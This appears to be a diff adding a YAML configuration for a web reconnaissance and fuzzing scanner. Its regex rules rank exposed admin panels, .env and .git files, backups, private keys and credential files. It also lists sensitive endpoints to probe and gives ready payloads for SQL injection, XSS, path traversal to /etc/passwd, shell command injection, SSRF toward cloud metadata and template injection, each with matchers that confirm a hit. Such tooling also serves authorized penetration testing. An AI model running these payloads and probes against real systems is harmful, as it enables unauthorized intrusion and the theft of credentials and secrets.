@@ -1,0 +1,214 @@
+analyzer:
+  rules:
+    - pattern: "(admin|backend|dashboard|manage|control|panel|stg|stage|root|master|supervisor|panel-admin)"
+      weight: 100
+    - pattern: "(wp-admin|wp-login|administrator|strapi|backpack|phpmyadmin|pgadmin|pma|myadmin|filament|ghost)"
+      weight: 100
+    - pattern: "(cpanel|directadmin|webmin|solusvm|proxmox|vsphere|vcenter|cockpit|ajenti|plesk)"
+      weight: 100
+    - pattern: "(console|terminal|shell|cmd|exec|run|query|sql-workbench|nifi|airflow)"
+      weight: 100
+
+    - pattern: "\\.(env|bak|sql|zip|tar\\.gz|cfg|ini|git|svn|hg|bzr|rar|7z|log|db|sqlite|json|yml|yaml|pfx|key)$"
+      weight: 100
+    - pattern: "(\\.(git|svn|hg|azure-pipelines|github|gitlab-ci)|docker-compose|dockerfile|package\\.json|composer\\.json)"
+      weight: 100
+    - pattern: "(backup|dump|export|db_backup|config_backup|snapshots|archive|secrets|db-dump)"
+      weight: 100
+    - pattern: "(id_rsa|id_dsa|authorized_keys|known_hosts|pem|crt|key|pkcs12|pfx|id_ecdsa)$"
+      weight: 100
+    - pattern: "(credentials|passwd|password|shadow|htpasswd|secret_token|wp-config|settings\\.py|config\\.php)"
+      weight: 100
+
+    - pattern: "(actuator|metrics|health|env|mappings|beans|heapdump|threaddump|loggers|auditevents|jolokia)"
+      weight: 95
+    - pattern: "(k8s|kubernetes|kube-system|prometheus|grafana|alertmanager|nagios|zabbix|argocd|rancher)"
+      weight: 95
+    - pattern: "(consul|eureka|nacos|etcd|zookeeper|vault|leaking)"
+      weight: 95
+    - pattern: "(aws|amazon|gcp|google-cloud|azure|digitalocean|cloudflare|openstack|linode)"
+      weight: 90
+    - pattern: "_ignition/(execute-solution|health-check)|_profiler/|/telescope/|/horizon|rails/info/routes|django-debug-toolbar"
+      weight: 95
+
+    - pattern: "(login|signin|auth|oauth|session|token|register|signup|logout|signout|mfa|2fa)"
+      weight: 90
+    - pattern: "(captcha|sso|saml|jwt|openid|keycloak|okta|auth0)"
+      weight: 90
+    - pattern: "(forgot-password|reset-password|change-password|recovery)"
+      weight: 85
+
+    - pattern: "(api/v[0-9]+|graphql|v1|v2|v3|v4|v5|endpoint|rest|rpc|soap|ws|websocket)"
+      weight: 80
+    - pattern: "(swagger|doc|docs|openapi|apidoc|api-docs|graphiql|playground|altair)"
+      weight: 80
+    - pattern: "(debug|test|dev|sandbox|staging|demo|qa|local|localhost|internal)"
+      weight: 75
+    - pattern: "(internal-api|private-api|core-api|gateway|reverse-proxy|lb|loadbalancer)"
+      weight: 85
+
+    - pattern: "(download|upload|file|image|media|fetch|proxy|redirect|url|path|src|view|read|load)"
+      weight: 70
+
+predictor:
+  patterns:
+    - "api/v[0-9]+"
+    - "(admin|dashboard|manage|backend|panel|control)"
+    - "(debug|test|dev|sandbox|staging|qa)"
+    - "(config|settings|setup|options|preferences)"
+    - "(actuator|metrics|health)"
+    - "(swagger|docs|openapi)"
+    - "(v1|v2|v3|v4|v5)"
+    - "_profiler"
+
+phantom_detector:
+  mutations:
+    - find: "profile"
+      replace: "settings"
+    - find: "user"
+      replace: "admin"
+    - find: "login"
+      replace: "register"
+    - find: "v1"
+      replace: "v2"
+    - find: "v2"
+      replace: "v3"
+    - find: "v1"
+      replace: "internal"
+    - find: "prod"
+      replace: "dev"
+    - find: "prod"
+      replace: "stg"
+    - find: "public"
+      replace: "private"
+    - find: "public"
+      replace: "internal"
+    - find: "docs"
+      replace: "swagger"
+    - find: "index"
+      replace: "dashboard"
+
+  common_endpoints:
+    - "/admin/"
+    - "/administrator/"
+    - "/dashboard/"
+    - "/backend/"
+    - "/private/"
+    - "/internal/"
+    - "/api/v1/"
+    - "/api/v2/"
+    - "/graphql"
+    - "/graphiql"
+    - "/swagger-ui.html"
+    - "/swagger/index.html"
+    - "/api-docs"
+    - "/openapi.json"
+    - "/actuator/"
+    - "/actuator/env"
+    - "/actuator/heapdump"
+    - "/metrics"
+    - "/.env"
+    - "/.env.bak"
+    - "/.env.example"
+    - "/.git/config"
+    - "/.git/HEAD"
+    - "/config"
+    - "/backup/"
+    - "/backup.zip"
+    - "/backup.sql"
+    - "/dump.sql"
+    - "/phpinfo.php"
+    - "/server-status"
+
+fuzz_engine:
+  fuzz_vectors:
+    sqli:
+      payloads:
+        - "'"
+        - "\""
+        - "' OR '1'='1"
+        - "' OR 1=1 -- "
+        - "' OR 1=1 # "
+        - "'; WAITFOR DELAY '0:0:5'-- "
+        - "') OR pg_sleep(5)--"
+        - "' OR SLEEP(5) "
+      matchers:
+        type: or
+        status: [500, 200]
+        regex:
+          - "(sql syntax|mysql_fetch|ora-[0-9]+|sqlite3\\.error|postgre.*error|driver.*exception)"
+          - "(Warning.*database|Unclosed quotation mark|SQLSTATE\\[)"
+
+    xss:
+      payloads:
+        - "<script>alert(1)</script>"
+        - "\"><script>alert(1)</script>"
+        - "javascript:alert(1)"
+        - "<img src=x onerror=alert(1)>"
+        - "\"><img src=x onerror=alert(1)>"
+        - "';alert(1);//"
+      matchers:
+        type: or
+        status: [200]
+        regex:
+          - "(<script>alert\\(1\\)</script>|src=x onerror=alert\\(1\\))"
+          - "(javascript:alert\\(1\\)|';alert\\(1\\);\\/\\/)"
+
+    lfi:
+      payloads:
+        - "../../../../../../../../etc/passwd"
+        - "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"
+        - "../../../../../../../../etc/passwd%00"
+        - "/etc/passwd"
+        - "../../../../../../../../proc/self/environ"
+      matchers:
+        type: or
+        status: [200]
+        regex:
+          - "root:x:[0-9]+:[0-9]+:"
+          - "\\[extensions\\]"
+
+    cmd:
+      payloads:
+        - ";cat /etc/passwd"
+        - "|id"
+        - "&&id"
+        - "`id`"
+        - "$(id)"
+        - ";id;"
+      matchers:
+        type: or
+        status: [200]
+        regex:
+          - "uid=[0-9]+\\(\\w+\\)\\s+gid=[0-9]+"
+
+    ssrf:
+      payloads:
+        - "http://169.254.169"
+        - "http://google.internal"
+        - "http://localhost:80/"
+        - "http://127.0.0"
+      matchers:
+        type: or
+        status: [200, 403]
+        regex:
+          - "(ami-id|instance-id|security-groups|computeMetadata|instance/metadata)"
+          - "(redis_version|root:x:)"
+
+    ssti:
+      payloads:
+        - "${7*7}"
+        - "{{7*7}}"
+        - "<%= 7*7 %>"
+      matchers:
+        type: or
+        status: [200]
+        regex:
+          - "(^|\\s)49(\\s|$)"
+
+  path_scan:
+    matchers:
+      type: and
+      status: [200]
+      negative_regex:
+        - "(page not found|страница не найдена|404 error|error-404|not found|ошибка 404)"
